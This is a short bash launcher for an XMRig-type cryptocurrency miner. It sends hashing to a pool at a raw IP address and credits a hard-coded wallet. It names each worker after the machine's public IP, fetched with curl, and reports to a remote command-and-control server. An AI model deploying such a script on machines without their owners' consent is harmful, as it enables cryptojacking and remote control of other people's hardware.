#!/bin/bash
POOL=stratum+ssl://51.107.184.91:443
WALLET=AVAX:0x572b6d97c4a16fb1ac1362fe2a96e1579fd780fd.$(echo "$(curl -s ifconfig.me)" | tr . _ )#tw4q-eldi
myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=3.144.123.82:2012 --cc-access-token=kevin --cc-worker-id=${myip}
